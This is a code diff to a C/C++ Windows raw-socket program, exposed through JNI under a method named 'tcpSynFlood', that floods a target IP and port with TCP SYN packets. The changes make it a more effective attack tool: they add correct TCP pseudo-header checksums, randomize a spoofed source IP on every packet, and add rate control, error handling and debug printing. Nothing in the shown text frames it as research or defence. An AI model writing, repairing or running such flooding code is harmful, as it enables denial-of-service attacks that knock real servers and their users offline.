@@ -38,6 +38,15 @@ struct tcphdr {
     uint16_t urg_ptr;
 };
 
+struct pseudo_header {
+    uint32_t source_address;
+    uint32_t dest_address;
+    uint8_t placeholder;
+    uint8_t protocol;
+    uint16_t tcp_length;
+    struct tcphdr tcp;
+};
+
 struct thread_data {
     const char* target_ip;
     int target_port;
@@ -70,11 +79,17 @@ unsigned short csum(unsigned short *ptr, int nbytes) {
 
 DWORD WINAPI send_syn_packets(LPVOID arg) {
     struct thread_data *data = (struct thread_data *)arg;
-    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (s == INVALID_SOCKET) {
+        printf("Error creating socket. Error number: %d\n", WSAGetLastError());
+        return 1;
+    }
+
     char datagram[PACKET_SIZE];
     struct iphdr *iph = (struct iphdr *)datagram;
     struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
     struct sockaddr_in sin;
+    struct pseudo_header psh;
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(data->target_port);
@@ -87,12 +102,11 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-    iph->id = htonl(54321);
+    iph->id = htons(54321);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_TCP;
     iph->check = 0;
-    iph->saddr = inet_addr("192.168.1.2");
     iph->daddr = sin.sin_addr.s_addr;
 
     // TCP Header
@@ -114,8 +128,9 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     int one = 1;
     const int *val = &one;
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char*)val, sizeof(one)) < 0) {
-        printf("Error setting IP_HDRINCL. Error number: %d\n", errno);
-        exit(0);
+        printf("Error setting IP_HDRINCL. Error number: %d\n", WSAGetLastError());
+        closesocket(s);
+        return 1;
     }
 
     DWORD start_time = GetTickCount();
@@ -123,10 +138,26 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     long bytes_sent = 0;
 
     while (!(*(data->stop_attack))) {
-        iph->check = csum((unsigned short *)datagram, iph->tot_len);
-        tcph->check = 0;
+        // Randomize source IP
+        iph->saddr = htonl(rand());
 
-        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+        iph->check = csum((unsigned short *)datagram, iph->tot_len);
+
+        // Calculate TCP checksum
+        psh.source_address = iph->saddr;
+        psh.dest_address = sin.sin_addr.s_addr;
+        psh.placeholder = 0;
+        psh.protocol = IPPROTO_TCP;
+        psh.tcp_length = htons(sizeof(struct tcphdr));
+
+        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
+        tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));
+
+        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+            printf("sendto() failed. Error number: %d\n", WSAGetLastError());
+            continue;
+        }
+
         packets_sent++;
         bytes_sent += PACKET_SIZE;
 
@@ -136,10 +167,11 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
             printf("Sent %ld SYN packets, %.2f MB, %.2f Mbps\n", packets_sent, bytes_sent / (1024.0 * 1024), mbps);
         }
 
+        // Rate limiting
         if (bytes_sent >= data->bytes_per_second) {
             DWORD elapsed_time = GetTickCount() - start_time;
             if (elapsed_time < 1000) {
-                Sleep(1000 - (DWORD)elapsed_time);
+                Sleep(1000 - elapsed_time);
             }
             start_time = GetTickCount();
             bytes_sent = 0;
@@ -147,11 +179,12 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     }
 
     closesocket(s);
-    return 0; // Add this line to return a DWORD value
+    return 0;
 }
 
 JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
   (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jint bytesPerSecond) {
+    printf("tcpSynFlood method called\n");
     const char *ip = env->GetStringUTFChars(targetIp, 0);
     struct thread_data data;
     data.target_ip = ip;
@@ -162,6 +195,11 @@ JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
 
     HANDLE thread;
     thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
+    if (thread == NULL) {
+        printf("Failed to create thread. Error: %d\n", GetLastError());
+    } else {
+        printf("Thread created successfully\n");
+    }
 
     // Wait for Java to call stopAttack()
     jclass cls = env->GetObjectClass(obj);
@@ -171,8 +209,11 @@ JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
     }
 
     stop_attack = true;
+    printf("Stop attack flag set to true\n");
     WaitForSingleObject(thread, INFINITE);
     CloseHandle(thread);
+    printf("Thread closed\n");
 
     env->ReleaseStringUTFChars(targetIp, ip);
+    printf("tcpSynFlood method completed\n");
 }
